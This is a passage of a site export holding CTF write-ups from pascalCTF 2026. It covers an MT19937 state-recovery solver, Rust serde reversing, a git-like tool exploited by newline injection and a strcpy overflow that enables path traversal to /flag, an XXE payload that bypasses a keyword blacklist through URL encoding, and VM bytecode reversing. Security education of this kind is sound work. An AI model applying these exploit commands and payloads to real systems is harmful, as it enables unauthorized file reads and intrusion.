0x9D2C5680) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 15) \u0026amp; 0xEFC60000) tempered = tempered ^ LShR(tempered, 18) s.add(Extract(19, 0, tempered) == observations[i]) if len(observations) \u0026gt; N: # Compute twisted state symbolically MATRIX_A = BitVecVal(0x9908B0DF, 32) twisted = [] for i in range(N): y = (state[i] \u0026amp; 0x80000000) | (state[(i + 1) % N] \u0026amp; 0x7FFFFFFF) twisted.append(state[(i + 397) % N] ^ LShR(y, 1) ^ If((y \u0026amp; 1) == 1, MATRIX_A, BitVecVal(0, 32))) # Epoch 1: outputs 624-1247 for i in range(N, min(2 * N, len(observations))): idx = i - N tempered = twisted[idx] tempered = tempered ^ LShR(tempered, 11) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 7) \u0026amp; 0x9D2C5680) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 15) \u0026amp; 0xEFC60000) tempered = tempered ^ LShR(tempered, 18) s.add(Extract(19, 0, tempered) == observations[i]) if len(observations) \u0026gt; 2 * N: # Second twist twisted2 = [] for i in range(N): y = (twisted[i] \u0026amp; 0x80000000) | (twisted[(i + 1) % N] \u0026amp; 0x7FFFFFFF) twisted2.append(twisted[(i + 397) % N] ^ LShR(y, 1) ^ If((y \u0026amp; 1) == 1, MATRIX_A, BitVecVal(0, 32))) # Epoch 2: outputs 1248+ for i in range(2 * N, len(observations)): idx = i - 2 * N tempered = twisted2[idx] tempered = tempered ^ LShR(tempered, 11) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 7) \u0026amp; 0x9D2C5680) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 15) \u0026amp; 0xEFC60000) tempered = tempered ^ LShR(tempered, 18) s.add(Extract(19, 0, tempered) == observations[i]) s.check() return [s.model()[state[i]].as_long() for i in range(N)] io = remote(\u0026#34;wordy.ctf.pascalctf.it\u0026#34;, 5005) # io = process([\u0026#39;python3\u0026#39;, \u0026#39;service.py\u0026#39;], env={\u0026#34;FLAG\u0026#34;: \u0026#34;test{flag}\u0026#34;}) io.recvuntil(b\u0026#34;READY\u0026#34;) observations = [] for i in range(1260): io.sendline(b\u0026#34;NEW\u0026#34;) io.recvuntil(b\u0026#34;ROUND STARTED\u0026#34;) secret = solve_wordle(io) observations.append(word_to_index(secret)) state = recover_state(observations) rng = MT19937(state, 0) for _ in range(len(observations)): rng.next_u32() for _ in range(5): pred = rng.next_u32() \u0026amp; 0xFFFFF io.sendline(f\u0026#34;FINAL {index_to_word(pred)}\u0026#34;.encode()) print(io.recvline().decode()) io.interactive() Flag # pascalCTF{Y0ur_l1k3_a_3ncycl0p3d14_0f_r4nd0m_w0rds!} ","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/wordy/","section":"CTFs","summary":"Recovering MT19937 state from partial outputs using Z3 SAT solving.","title":"Wordy","type":"ctfs"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/z3/","section":"Tags","summary":"","title":"Z3","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/blacklist-bypass/","section":"Tags","summary":"","title":"Blacklist-Bypass","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/buffer-overflow/","section":"Tags","summary":"","title":"Buffer-Overflow","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/bytecode/","section":"Tags","summary":"","title":"Bytecode","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/command-injection/","section":"Tags","summary":"","title":"Command-Injection","type":"tags"},{"content":"A crab stole my json schema\u0026hellip;\nThe challenge is a Rust binary that reads JSON from stdin and outputs either a crab emoji (success) or a sad face (failure):\n$ echo \u0026#39;{\u0026#34;test\u0026#34;: 1}\u0026#39; | ./curly-crab Give me a JSONy flag! ğŸ˜” $ echo \u0026#39;???\u0026#39; | ./curly-crab Give me a JSONy flag! ğŸ¦€ We need to figure out what JSON structure makes the crab happy.\nWhy Rust reversing is painful # Coming from C reversing, Rust binaries have some extra headaches:\nMonomorphization: Generic functions get duplicated for each concrete type. A simple Vec\u0026lt;T\u0026gt; becomes separate code for Vec\u0026lt;i32\u0026gt;, Vec\u0026lt;String\u0026gt;, etc. The binary bloats with near-identical functions.\nAggressive inlining: Small functions get inlined everywhere. What would be a clean call instruction in C becomes a wall of duplicated code.\nStandard library bloat: Even simple operations pull in tons of library code for error handling, Result unwrapping, iterator machinery, etc. A \u0026ldquo;hello world\u0026rdquo; in Rust is 300KB+.\nName mangling on steroids: Function names become monstrosities like _ZN4core3ptr85drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$17h3b2c...\nOwnership/borrowing artifacts: The decompiled code is littered with drop_in_place calls, reference counting, and move semantics that obscure the actual logic.\nThe saving grace here: Rust\u0026rsquo;s serde library generates predictable patterns for JSON deserialization.\nThe reality: what you\u0026rsquo;re actually looking at # Before showing the cleaned-up version, here\u0026rsquo;s what Rust binaries actually look like in a decompiler. This is the real main function:\nint64_t curly_crab::main::h71b58f7aacf87a44() { std::io::stdio::_print::h526c462071e58c18(\u0026amp;data_7a8b[0x91], 0x2d); std::io::stdio::stdin::h11deceff11981680(); void* var_30 = \u0026amp;std::io::stdio::stdin::INSTANCE::h067a27bca4e07de8; int32_t* rax; rax = std::io::stdio::Stdin::lock::h1079d43173269675(\u0026amp;var_30); // ... 50 more lines of Result unwrapping and panic handling ... serde_json::de::from_trait::h1f3bcad3bd3177ac(\u0026amp;var_80, \u0026amp;var_d8); if (var_80 != -0x8000000000000000) { std::io::stdio::_print::h526c462071e58c18(\u0026amp;data_7b32, 0xb); // ğŸ¦€ } else { std::io::stdio::_eprint::hbab4723ed852db00(\u0026amp;data_7b37, 0xb); // ğŸ˜” } // ... 30 more lines of cleanup ... } The useful bits are buried in noise. Here\u0026rsquo;s how to navigate it.\nPractical tips for reversing Rust/serde # 1. Use function names as landmarks # Even mangled, the names tell you what\u0026rsquo;s happening:\nserde_json::de::from_trait â†’ JSON parsing entry point deserialize_struct â†’ struct field parsing deserialize_bool, deserialize_string â†’ primitive types drop_in_place, __rust_dealloc â†’ cleanup (ignore these) 2. Field matching follows a pattern # Serde checks field length first, then compares bytes as integers:\nif (rax_3 == 6) // length == 6 { if (!((*(r15_1 + 4) ^ 0x7962) | (*r15_1 ^ 0x62617263))) // matched! } The XOR-and-OR pattern (a ^ expected1) | (b ^ expected2) equals zero only if both match.\n3. Search for concatenated field names # Serde embeds field names in error messages. Search for strings like:\n\u0026#34;I_crabbycr4bsstruct Crab with 3 elements\u0026#34; This tells you the struct has fields I_, crabby, cr4bs and is called Crab.\n4. Ignore the noise # Most of the code is:\nResult/Option checking (-0x8000000000000000 is the Err/None discriminant) Memory cleanup (__rust_dealloc, drop_in_place) Whitespace skipping (the TEST_BITQ(0x100002600, ...) pattern) Panic handling Focus on the actual comparisons and function calls.\nIdentifying serde in the binary # Signs to look for:\nString references: Search for \u0026quot;expected struct\u0026quot;, \u0026quot;missing field\u0026quot;, \u0026quot;invalid type\u0026quot;.\nFunction name fragments: Look for serde, deserialize, Visitor, SeqAccess.\nConcatenated field names: Serde error messages contain field lists like \u0026quot;I_crabbycr4bs\u0026quot;.\nSearching strings for \u0026ldquo;struct\u0026rdquo; reveals the struct names:\n\u0026#34;expected struct TopLevel\u0026#34; \u0026#34;expected struct Crab\u0026#34; \u0026#34;expected struct Crabby\u0026#34; This tells us the hierarchy. Now we need the field names.\nHow serde deserialization works # Serde is Rust\u0026rsquo;s serialization framework. When you write:\n#[derive(Deserialize)] struct Crab { I_: bool, crabby: Crabby, cr4bs: i32, } The #[derive(Deserialize)] macro generates a deserialize function that:\nExpects either { (object) or [ (tuple/array format) Reads field names as strings Matches them against expected field names Recursively deserializes nested types Returns an error if anything doesn\u0026rsquo;t match The key insight: field name matching uses integer comparisons on the raw bytes. Instead of string comparison, serde compares chunks of the field name as integers for speed.\nFinding the entry point # Starting from main, trace the calls:\ncurly_crab::main::h71b58f7aacf87a44 â”‚ â””â”€â”€ serde_json::de::from_trait::h1f3bcad3bd3177ac â”‚ â””â”€â”€ deserialize_struct::he3c85fe01abee1f1 â† top-level struct The from_trait function is just a wrapper. The real work happens in deserialize_struct.\nWhat you\u0026rsquo;re actually looking for # Here\u0026rsquo;s a snippet from the real deserialize_struct for the top-level struct. I\u0026rsquo;ve annotated the important parts:\n// Inside deserialize_struct - the actual decompiled mess // ... skip past the \u0026#39;{\u0026#39; check and 100 lines of setup ... // THIS IS THE GOLD - field length switch if (var_148 == 3) // â† field length check { // Compare bytes: (byte[2] ^ \u0026#39;F\u0026#39;) | (bytes[0:2] ^ 0x5443) if ((*(r13_1 + 2) ^ 0x46) | (*r13_1 ^ 0x5443)) goto label_2c1ab; // unknown field // Matched \u0026#34;CTF\u0026#34;! Now deserialize the value... } else if (var_148 == 4) { if (*r13_1 != 0x62617263) // â† compare as 4-byte int goto label_2c1ab; // Matched \u0026#34;crab\u0026#34;! Call nested struct deserializer _$LT$RF$mut$u20$serde_j...deserialize_struct::hb5c049ded4c5ad6a(\u0026amp;var_158, r15_1); } else if (var_148 == 6) { // Two comparisons: 4 bytes + 2 bytes if ((*(r13_1 + 4) ^ 0x6c61) | (*r13_1 ^ 0x63736170)) goto label_2c1ab; // Matched \u0026#34;pascal\u0026#34;! Deserialize string _$LT$RF$mut$u20$serde_j...deserialize_string::h4c289388cf84ac5d(\u0026amp;var_d8, r15_1); } The pattern to look for:\nLength check in an if/switch Byte comparisons using XOR: (a ^ expected) | (b ^ expected) (equals 0 if match) Call to another deserialize_* function for the value Mapping the struct hierarchy # Follow the deserialize_struct calls to find nested structs. Each one has the same pattern of length checks and hex comparisons.\nTop-level struct # From the code above:\nCTF (len=3, 0x5443 + 0x46) â†’ integer crab (len=4, 0x62617263) â†’ nested struct via deserialize_struct::hb5c049ded4c5ad6a pascal (len=6, 0x63736170 + 0x6c61) â†’ string Nested \u0026ldquo;crab\u0026rdquo; struct # Following deserialize_struct::hb5c049ded4c5ad6a, same pattern:\nif (rax_3 == 2) // \u0026#34;I_\u0026#34; if (*r15_1 != 0x5f49) goto unknown; // deserialize_bool else if (rax_3 == 5) // \u0026#34;cr4bs\u0026#34; if ((*(r15_1 + 4) ^ 0x73) | (*r15_1 ^ 0x62347263)) goto unknown; // deserialize integer else if (rax_3 == 6) // \u0026#34;crabby\u0026#34; if ((*(r15_1 + 4) ^ 0x7962) | (*r15_1 ^ 0x62617263)) goto unknown; // deserialize_struct::h39718c3ed97ba090 (another nested struct!) Fields: I_ (bool), cr4bs (int), crabby (struct)\nInner \u0026ldquo;crabby\u0026rdquo; struct # Following the next deserialize_struct:\nl0v3_ (len=5, 0x7633306c + 0x5f) â†’ array r3vv1ng_ (len=8, 0x5f676e3176763372) â†’ integer Visual hierarchy # Top-level â”œâ”€â”€ CTF: integer â”œâ”€â”€ crab: struct â”‚ â”œâ”€â”€ I_: boolean â”‚ â”œâ”€â”€ crabby: struct â”‚ â”‚ â”œâ”€â”€ r3vv1ng_: integer â”‚ â”‚ â””â”€â”€ l0v3_: array â”‚ â””â”€â”€ cr4bs: integer â””â”€â”€ pascal: string Constructing valid JSON # Based on the schema:\n{ \u0026#34;CTF\u0026#34;: 1, \u0026#34;crab\u0026#34;: { \u0026#34;I_\u0026#34;: true, \u0026#34;crabby\u0026#34;: { \u0026#34;r3vv1ng_\u0026#34;: 1, \u0026#34;l0v3_\u0026#34;: [] }, \u0026#34;cr4bs\u0026#34;: 1 }, \u0026#34;pascal\u0026#34;: \u0026#34;test\u0026#34; } Testing:\n$ echo \u0026#39;{\u0026#34;CTF\u0026#34;:1,\u0026#34;crab\u0026#34;:{\u0026#34;I_\u0026#34;:true,\u0026#34;crabby\u0026#34;:{\u0026#34;r3vv1ng_\u0026#34;:1,\u0026#34;l0v3_\u0026#34;:[]},\u0026#34;cr4bs\u0026#34;:1},\u0026#34;pascal\u0026#34;:\u0026#34;x\u0026#34;}\u0026#39; | ./curly-crab Give me a JSONy flag! ğŸ¦€ Extracting the flag # Some people submitted massive JSON documents that happened to work because they included the required fields somewhere. The key is understanding what\u0026rsquo;s actually being validated: just the field names and types, nothing more.\nThe field names spell out the flag: I_, l0v3_, r3vv1ng_, cr4bs.\nFlag # pascalCTF{I_l0v3_r3vv1ng_cr4bs} ","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/curly-crab/","section":"CTFs","summary":"Reversing Rust serde deserialization to recover a JSON schema.","title":"Curly Crab","type":"ctfs"},{"content":"Many friends of mine hate git, so I made a git-like tool for them.\nThe flag can be found at /flag.\nssh \u0026lt;user\u0026gt;@git.ctf.pascalctf.it -p2222 The challenge provides a simplified git implementation called mygit:\n$ mygit Usage: mygit \u0026lt;command\u0026gt; [args] Commands: init Initialize repository add \u0026lt;file\u0026gt; Stage file commit -m \u0026lt;msg\u0026gt; Create commit branch [name] List/create branches checkout \u0026lt;branch\u0026gt; Switch branch status Show status log Show history The binary runs as a privileged user and can read /flag. We need to find a way to leak its contents.\nVulnerability 1: Newline injection in commit messages # The commit command writes the message directly into the commit file using sprintf:\nsprintf(buffer, \u0026#34;message %s\\n\u0026#34;, msg); No sanitization. If we include newlines in the message, we can inject arbitrary fields into the commit file format. The commit file structure looks like:\ntree \u0026lt;hash\u0026gt; parent \u0026lt;hash\u0026gt; message \u0026lt;msg\u0026gt; files \u0026lt;count\u0026gt; \u0026lt;hash\u0026gt; \u0026lt;path\u0026gt; \u0026lt;hash\u0026gt; \u0026lt;path\u0026gt; ... By injecting \\nfiles 1\\n\u0026lt;hash\u0026gt; \u0026lt;path\u0026gt;, we can add fake file entries that will be processed during checkout.\nVulnerability 2: Buffer overflow in path validation # The validate_path function checks for path traversal:\nstruct { int valid; char buffer[32]; } ctx; int validate_path(char *path) { ctx.valid = 1; if (strstr(path, \u0026#34;..\u0026#34;) != NULL) { ctx.valid = 0; } strcpy(ctx.buffer, path); // No bounds check! return ctx.valid; } The problem: strcpy has no length limit. If path is longer than 32 bytes, it overflows buffer and corrupts valid.\nMemory layout:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ctx.buffer (32 bytes) â”‚ ctx.valid â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â†‘ overflow overwrites this If we provide a path like ../../../../../../../../../../../../flag (40+ chars), the overflow writes past buffer into valid. Even though strstr sets valid = 0 (because of \u0026ldquo;..\u0026rdquo;), the subsequent strcpy overflow corrupts it back to a non-zero value, making the function return \u0026ldquo;valid\u0026rdquo;.\nPutting it together # During checkout, for each file in the commit:\nvalidate_path(file-\u0026gt;hash); // Check hash path validate_path(file-\u0026gt;path); // Check destination path content = object_read(file-\u0026gt;hash); // Read from .mygit/objects/\u0026lt;hash\u0026gt; file_write(file-\u0026gt;path, content); // Write to destination The object_read constructs the path:\nsnprintf(obj_path, 0x400, \u0026#34;.mygit/objects/%s\u0026#34;, hash); Attack plan:\nInject a fake file entry via commit message Use a hash like ../../../../../../../../../../../../flag The long path overflows validate_path, corrupting valid to bypass the \u0026ldquo;..\u0026rdquo; check object_read reads .mygit/objects/../../../../../../../../../../../../flag = /flag Content gets written to our controlled output file Exploit # # Initialize repo mygit init # Create and commit a dummy file (needed for valid repo state) echo x \u0026gt; x mygit add x mygit commit -m \u0026#34;first\u0026#34; # Create a branch to switch between mygit branch b # Create output file we can write to touch out chmod 777 out # Inject malicious commit with path traversal payload # The long path overflows validate_path\u0026#39;s buffer, corrupting the valid flag mygit commit -m $\u0026#39;p\\nfiles 1\\n../../../../../../../../../../../../flag out\u0026#39; # Trigger the checkout to read /flag and write to out mygit checkout b mygit checkout main # Read the flag cat out The commit message $'p\\nfiles 1\\n../../../../../../../../../../../../flag out' becomes:\nmessage p files 1 ../../../../../../../../../../../../flag out When we checkout main, it processes this fake file entry, reads /flag, and writes it to out.\nFlag # pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw} ","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/grande-inutile-tool/","section":"CTFs","summary":"Buffer overflow corrupts path validation flag, enabling path traversal.","title":"Grande Inutile Tool","type":"ctfs"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/javascript/","section":"Tags","summary":"","title":"Javascript","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/json/","section":"Tags","summary":"","title":"Json","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/lfi/","section":"Tags","summary":"","title":"Lfi","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/nan/","section":"Tags","summary":"","title":"NaN","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/path-traversal/","section":"Tags","summary":"","title":"Path-Traversal","type":"tags"},{"content":"I\u0026rsquo;ve recently developed a XML to PDF utility, I\u0026rsquo;ll probably add payments to it soon!\nThe challenge is a Flask web app that converts XML files into PDFs. The .pasx extension is just a made-up format for this challenge (probably \u0026ldquo;Pascal XML\u0026rdquo; or similar), but it\u0026rsquo;s plain XML underneath.\nWhat is XXE? # XXE (XML External Entity) injection is a vulnerability in XML parsers. To understand it, we need to know about XML entities.\nEntities in XML # XML has a feature called \u0026ldquo;entities\u0026rdquo;, which are like variables. You define them in a DOCTYPE declaration and reference them with \u0026amp;name;:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY greeting \u0026#34;Hello, World!\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt; \u0026lt;message\u0026gt;\u0026amp;greeting;\u0026lt;/message\u0026gt; \u0026lt;/note\u0026gt; When parsed, \u0026amp;greeting; gets replaced with \u0026ldquo;Hello, World!\u0026rdquo;. This is useful for reusing text or defining special characters.\nExternal entities # The dangerous part is external entities. Instead of defining inline content, you can tell the parser to fetch content from a URI:\n\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; The SYSTEM keyword means \u0026ldquo;fetch this from an external source\u0026rdquo;. The parser will read /etc/passwd and substitute its contents wherever \u0026amp;xxe; appears. This is XXE.\nWhy does this feature exist? # External entities were designed for legitimate use cases like:\nSplitting large documents across multiple files Including shared content (like a common header) in multiple documents Referencing DTD (Document Type Definition) files for validation The feature predates modern security concerns. Most XML parsers have it enabled by default for backwards compatibility, which is why XXE is such a common vulnerability.\nWhat can you do with XXE? # Read local files: SYSTEM \u0026quot;file:///etc/passwd\u0026quot; SSRF (Server-Side Request Forgery): SYSTEM \u0026quot;http://internal-server/\u0026quot; Denial of service: The \u0026ldquo;billion laughs\u0026rdquo; attack uses nested entities to consume memory Port scanning: Timing differences reveal open ports In some cases, remote code execution: Via expect:// or other protocol handlers The vulnerability # The XML parser is configured with external entity resolution enabled:\nparser = etree.XMLParser(encoding=\u0026#39;utf-8\u0026#39;, no_network=False, resolve_entities=True, recover=True) root = etree.fromstring(xml_content, parser=parser) The resolve_entities=True flag tells lxml to actually fetch and substitute external entities. Combined with no_network=False (allowing network requests), this parser is fully vulnerable to XXE.\nIn a secure configuration, you\u0026rsquo;d use resolve_entities=False or at minimum no_network=True. Many modern XML libraries disable external entities by default, but lxml wraps libxml2 which has them enabled by default for compatibility with legacy XML documents.\nWith this configuration, we can define external entities that read files from the filesystem:\n\u0026lt;!DOCTYPE book [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;/etc/passwd\u0026#34;\u0026gt; ]\u0026gt; When the parser encounters \u0026amp;xxe;, it will fetch the contents of /etc/passwd and substitute them inline.\nThe blacklist # Before parsing, the app runs a sanitization check:\ndef sanitize(xml_content): content_str = xml_content.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;\u0026amp;#\u0026#34; in content_str: return False blacklist = [ \u0026#34;flag\u0026#34;, \u0026#34;etc\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;proc\u0026#34;, \u0026#34;pascal\u0026#34;, \u0026#34;tmp\u0026#34;, \u0026#34;env\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;file\u0026#34;, \u0026#34;pascalctf is not fun\u0026#34;, ] if any(a in content_str.lower() for a in blacklist): return False return True This blocks obvious paths like /app/flag.txt or /etc/passwd by checking if the raw XML string contains blacklisted words. It also blocks \u0026amp;# to prevent XML character entity encoding like \u0026amp;#102; for f.\nThe bypass # The blacklist operates on the raw XML string, but the XML parser processes the content differently. Specifically, libxml2 (used by lxml) decodes URL-encoded characters in SYSTEM entity paths.\nSo we can URL-encode the blocked word:\nOriginal URL-encoded flag %66%6C%61%67 The Python blacklist sees %66%6C%61%67 and doesn\u0026rsquo;t match \u0026ldquo;flag\u0026rdquo;. But when libxml2 resolves the entity path /app/%66%6C%61%67.txt, it decodes the percent-encoding and reads /app/flag.txt.\nExploit # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE book [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;/app/%66%6C%61%67.txt\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;book\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;author\u0026gt;x\u0026lt;/author\u0026gt; \u0026lt;year\u0026gt;2024\u0026lt;/year\u0026gt; \u0026lt;isbn\u0026gt;000\u0026lt;/isbn\u0026gt; \u0026lt;chapters\u0026gt; \u0026lt;chapter number=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;title\u0026gt;x\u0026lt;/title\u0026gt; \u0026lt;content\u0026gt;x\u0026lt;/content\u0026gt; \u0026lt;/chapter\u0026gt; \u0026lt;/chapters\u0026gt; \u0026lt;/book\u0026gt; Upload this as a .pasx file, and the generated PDF will contain the flag as the book title.\nFlag # pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng} ","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/pdfile/","section":"CTFs","summary":"XXE injection with blacklist bypass via URL encoding.","title":"Pdfile","type":"ctfs"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/topics/rev/","section":"Topics","summary":"Reverse engineering challenges and program analysis.","title":"Rev","type":"topics"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/rust/","section":"Tags","summary":"","title":"Rust","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/serde/","section":"Tags","summary":"","title":"Serde","type":"tags"},{"content":"A stranger once built a VM and hid the Forbidden Key, can you uncover it?\nWe get a VM binary and a bytecode file code.pascal. Running it asks for input and either accepts or rejects.\nFinding the VM loop # Opening the binary reveals a simple fetch-decode-execute loop:\nwhile (1) { opcode = bytecode[pc]; pc++; switch (opcode) { case 0: // HALT return; case 1: // ADD addr = *(uint32_t*)\u0026amp;bytecode[pc]; imm = bytecode[pc + 4]; pc += 5; mem[addr] = (mem[addr] + imm) \u0026amp; 0xFF; break; case 2: // SUB addr = *(uint32_t*)\u0026amp;bytecode[pc]; imm = bytecode[pc + 4]; pc += 5; mem[addr] = (mem[addr] - imm) \u0026amp; 0xFF; break; case 3: // MOD addr = *(uint32_t*)\u0026amp;bytecode[pc]; imm = bytecode[pc + 4]; pc += 5; mem[addr] = mem[addr] % imm; break; case 4: // MOV addr = *(uint32_t*)\u0026amp;bytecode[pc]; imm = bytecode[pc + 4]; pc += 5; mem[addr] = imm; break; case 5: // IN (read char) addr = *(uint32_t*)\u0026amp;bytecode[pc]; pc += 4; mem[addr] = getchar(); break; case 6: // JZ (jump if zero) addr = *(uint32_t*)\u0026amp;bytecode[pc]; offset = (int8_t)bytecode[pc + 4]; // signed! pc += 5; if (mem[addr] == 0) pc += offset; break; } } Opcode Mnemonic Encoding Description 0x00 HALT 00 Stop execution 0x01 ADD 01 \u0026lt;addr:4\u0026gt; \u0026lt;imm:1\u0026gt; mem[addr] += imm 0x02 SUB 02 \u0026lt;addr:4\u0026gt; \u0026lt;imm:1\u0026gt; mem[addr] -= imm 0x03 MOD 03 \u0026lt;addr:4\u0026gt; \u0026lt;imm:1\u0026gt; mem[addr] %= imm 0x04 MOV 04 \u0026lt;addr:4\u0026gt; \u0026lt;imm:1\u0026gt; mem[addr] = imm 0x05 IN 05 \u0026lt;addr:4\u0026gt; mem[addr] = getchar() 0x06 JZ 06 \u0026lt;addr:4\u0026gt; \u0026lt;off:1\u0026gt; Jump if mem[addr] == 0 Writing a disassembler # import struct def disassemble(bytecode): pc = 0 while pc \u0026lt; len(bytecode): opcode = bytecode[pc] if opcode == 0: print(f\u0026#34;{pc:04x}: HALT\u0026#34;) break elif opcode in [1, 2, 3, 4]: names = {1: \u0026#34;ADD\u0026#34;, 2: \u0026#34;SUB\u0026#34;, 3: \u0026#34;MOD\u0026#34;, 4: \u0026#34;MOV\u0026#34;} addr = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytecode[pc+1:pc+5])[0] imm = bytecode[pc+5] print(f\u0026#34;{pc:04x}: {names[opcode]} mem[{addr}], {imm}\u0026#34;) pc += 6 elif opcode == 5: addr = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytecode[pc+1:pc+5])[0] print(f\u0026#34;{pc:04x}: IN mem[{addr}]\u0026#34;) pc += 5 elif opcode == 6: addr = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytecode[pc+1:pc+5])[0] offset = bytecode[pc+5] if offset \u0026gt; 127: offset -= 256 # sign extend target = pc + 6 + offset print(f\u0026#34;{pc:04x}: JZ mem[{addr}], {offset:+d} -\u0026gt; {target:04x}\u0026#34;) pc += 6 with open(\u0026#34;code.pascal\u0026#34;, \u0026#34;rb\u0026#34;) as f: disassemble(f.read()) Analyzing the bytecode # The disassembled output shows a repeating pattern for each input character:\n0000: IN mem[0] ; read char 0 0005: MOV mem[1], 0 ; temp = 0 000b: MOD mem[1], 2 ; temp = 0 % 2 = 0 0011: JZ mem[1], +12 ; if temp == 0, jump to ADD 0017: SUB mem[0], 0 ; (skipped) char -= 0 001d: JZ mem[1023], +6 ; unconditional jump (mem[1023] is always 0) 0023: ADD mem[0], 0 ; char += 0 0029: IN mem[1] ; read char 1 002e: MOV mem[2], 1 ; temp = 1 0034: MOD mem[2], 2 ; temp = 1 % 2 = 1 003a: JZ mem[2], +12 ; if temp == 0 (false), continue 0040: SUB mem[1], 1 ; char -= 1 0046: JZ mem[1023], +6 ; unconditional jump past ADD 004c: ADD mem[1], 1 ; (skipped) 0052: IN mem[2] ; read char 2 0057: MOV mem[3], 2 ; temp = 2 005d: MOD mem[3], 2 ; temp = 2 % 2 = 0 0063: JZ mem[3], +12 ; if temp == 0, jump to ADD 0069: SUB mem[2], 2 ; (skipped) 006f: JZ mem[1023], +6 ; unconditional jump 0075: ADD mem[2], 2 ; char += 2 ... The pattern:\nRead character into mem[i] Check if index i is odd or even via i % 2 If even: mem[i] += i If odd: mem[i] -= i The JZ mem[1023] is a clever unconditional jump. Since mem[1023] is never written, it stays 0, so the jump always triggers.\nFinding the target values # After the bytecode finishes, main compares the result:\nif (strcmp(mem, flag)) puts(\u0026#34;Execution failed. The code did not match the expected flag.\u0026#34;); else puts(\u0026#34;Congratulations! You have successfully executed the code.\u0026#34;); Where flag points to:\nchar flag[0x29] = \u0026#34;VLu\\\\8m9Xl(\u0026gt;W{_?TD[q \\x82\\x1b\\x8bP\\x80F~\\x15\\x8aW}ZPT\\x81Q\\x8c\\x0c\\x94D\u0026#34;; The target bytes are right there in the binary.\nSolving # Reverse the transformation:\ntarget = bytes([ 0x56, 0x4C, 0x75, 0x5C, 0x38, 0x6D, 0x39, 0x58, 0x6C, 0x28, 0x3E, 0x57, 0x7B, 0x5F, 0x3F, 0x54, 0x44, 0x5B, 0x71, 0x20, 0x82, 0x1B, 0x8B, 0x50, 0x80, 0x46, 0x7E, 0x15, 0x8A, 0x57, 0x7D, 0x5A, 0x50, 0x54, 0x81, 0x51, 0x8C, 0x0C, 0x94, 0x44 ]) flag = bytearray() for i, b in enumerate(target): if i % 2 == 0: flag.append((b - i) \u0026amp; 0xFF) # reverse of +i else: flag.append((b + i) \u0026amp; 0xFF) # reverse of -i print(flag.decode()) Flag # pascalCTF{VMs_4r3_d14bol1c4l_3n0ugh_d0nt_y0u_th1nk} ","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/strangevm/","section":"CTFs","summary":"Reverse a simple VM to understand its character transformation.","title":"StrangeVM","type":"ctfs"},{"content":"Nel mezzo del cammin di nostra vita mi ritrovai per una selva oscura, chÃ© la diritta via era smarrita.\nThe flag can be found here /app/flag.txt\nThe challenge presents a \u0026ldquo;Travel Playlist\u0026rdquo; website with a gallery of travel-themed songs. You can navigate between pages 1-7, each showing a different song with a YouTube link.\nNo source code was provided, so we need to figure out how the site works.\nA false 